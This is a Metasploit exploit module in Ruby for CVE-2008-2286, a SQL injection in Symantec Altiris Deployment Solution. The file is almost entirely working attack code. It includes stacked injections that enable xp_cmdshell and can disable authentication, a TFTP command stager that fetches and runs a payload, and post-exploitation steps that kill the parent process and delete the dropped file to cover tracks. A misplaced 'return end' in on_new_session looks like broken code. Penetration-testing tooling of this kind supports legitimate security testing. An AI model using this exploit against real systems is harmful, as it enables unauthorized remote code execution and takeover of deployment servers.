# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
 Rank = NormalRanking

 include Msf::Exploit::CmdStagerTFTP
 include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Symantec Altiris DS SQL Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution 6.8
        to 6.9.164. The vulnerability exists on axengine.exe which fails to adequately sanitize
        numeric input fields in "UpdateComputer" notification Requests. In order to spawn a shell,
        several SQL injections are required in close succession, first to enable xp_cmdshell, then
        retrieve the payload via TFTP and finally execute it. The module also has the capability
        to disable or enable local application authentication. In order to work the target system
        must have a tftp client available.
      },
      &#039;Author&#039;         =>
        [
          &#039;Brett Moore&#039;,  # Vulnerability discovery
          &#039;3v0lver&#039;       # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2008-2286&#039; ],
          [ &#039;OSVDB&#039;, &#039;45313&#039; ],
          [ &#039;BID&#039;, &#039;29198&#039;],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-08-024&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Targets&#039; =>
        [
          [ &#039;Windows 2003 (with tftp client available)&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ]
        ],
      &#039;Privileged&#039; => true,
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;DisclosureDate&#039; => &#039;May 15 2008&#039;,
      &#039;DefaultTarget&#039; => 0))

    register_options(
    [
      Opt::RPORT(402),
      OptBool.new(&#039;XP_CMDSHELL&#039;,      [ true, "Enable xp_cmdshell prior to exploit", true]),
      OptBool.new(&#039;DISABLE_SECURITY&#039;, [ true, "Exploit SQLi to execute wc_upd_disable_security and disable Console Authentication", false ]),
      OptBool.new(&#039;ENABLE_SECURITY&#039;,  [ true, "Enable Local Deployment Console Authentication", false ])
    ], self.class)

  end

  def execute_command(cmd, opts = {})
    inject=[]

    if @xp_shell_enable
      inject+=[
        "#{Rex::Text.to_hex("sp_configure \"show advanced options\", 1; reconfigure",&#039;&#039;)}",
        "#{Rex::Text.to_hex("sp_configure \"xp_cmdshell\", 1; reconfigure",&#039;&#039;)}",
      ]
      @xp_shell_enable = false
    end

    if @wc_disable_security
      inject+=["#{Rex::Text.to_hex("wc_upd_disable_security",&#039;&#039;)}"]
      @wc_disable_security = false
    end

    if @wc_enable_security
      inject+=["#{Rex::Text.to_hex("wc_upd_enable_security",&#039;&#039;)}"]
      @wc_enable_security = false
    end

    inject+=["#{Rex::Text.to_hex("master.dbo.xp_cmdshell \&#039;cd %TEMP% && cmd.exe /c #{cmd}\&#039;",&#039;&#039;)}"] if cmd != nil

    inject.each do |sqli|
      send_update_computer("2659, null, null;declare @querya VARCHAR(255);select @querya = 0x#{sqli};exec(@querya);--")
    end
  end

 def send_update_computer(processor_speed)
   notification = %Q|Request=UpdateComputer
OS-Bit=32
CPU-Arch=x86
IP-Address=192.168.20.107
MAC-Address=005056C000AB
Name=Remove_test
OS=Windows XP
Version=2.6-38 (32-Bit)
LoggedIn=Yes
Boot-Env=Automation
Platform=Linux
Agent-Settings=Same
Sys-Info-TimeZoneBias=0
Processor=Genuine Intel Intel(R) Core(TM) i7 CPU M 620 @ 2.67GHz
Processor-Speed=#{processor_speed}
   \x00
   |

   connect
   sock.put(notification)
   response = sock.get_once()
   disconnect

   return response
 end

  def check
    res = send_update_computer("2659")

    unless res and res =~ /Result=Success/ and res=~ /DSVersion=(.*)/
      return Exploit::CheckCode::Unknown
    end

    version = $1

    unless version =~ /^6\.(\d+)\.(\d+)$/
      return Exploit::CheckCode::Safe
    end

    print_status "#{rhost}:#{rport} - Altiris DS Version &#039;#{version}&#039;"

    minor = $1.to_i
    build = $2.to_i

    if minor == 8
      if build == 206 || build == 282 || build == 378
        return Exploit::CheckCode::Vulnerable
      elsif build < 390
        return Exploit::CheckCode::Appears
      end
    elsif minor == 9 and build < 176
      #The existence of versions matching this profile is a possibility... none were observed in the wild though
      #as such, we&#039;re basing confidence off of Symantec&#039;s vulnerability bulletin.
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    @wc_disable_security = datastore[&#039;DISABLE_SECURITY&#039;]
    @wc_enable_security = datastore[&#039;ENABLE_SECURITY&#039;]
    @xp_shell_enable = datastore[&#039;XP_CMDSHELL&#039;]

    # CmdStagerVBS was tested here as well, however delivery took roughly
    # 30 minutes and required sending almost 350 notification messages.
    # size constraint requirement for SQLi is: linemax => 393
    execute_cmdstager({ :delay => 1.5, :temp => &#039;%TEMP%\\&#039;})
  end

  def on_new_session(client)
    return if not payload_exe

    #can&#039;t scrub dropped payload while the process is still active so...
    #iterate through process list, find our process and the associated
    #parent process ID, Kill the parent.
    #This module doesn&#039;t use FileDropper because of timing issues when
    #using migrate -f and FileDropper. On the other hand PrependMigrate
    #has been avoided because of issues with reverse_https payload
    #SeeRM#8365 https://http://dev.metasploit.com/redmine/issues/8365

      return
    end

    client.core.use("stdapi") unless client.ext.aliases.include?("stdapi")
    # migrate
    print_status("Migrating ...")
    client.console.run_single("run migrate -f")
    # kill the parent process so the payload can hopefully be dropped
    print_status("Kill parent process ...")
    client.sys.process.get_processes().each do |proc|
      if proc[&#039;pid&#039;] == client.sys.process.open.pid
          client.sys.process.kill(proc[&#039;ppid&#039;])
      end
    end

    win_temp = client.fs.file.expand_path("%TEMP%")
    win_file = "#{win_temp}\\#{payload_exe}"
    print_status("Attempting to delete #{win_file} ...")
    client.shell_command_token(%Q|attrib.exe -r #{win_file}|)
    client.fs.file.rm(win_file)
    print_good("Deleted #{win_file}")
  end

end

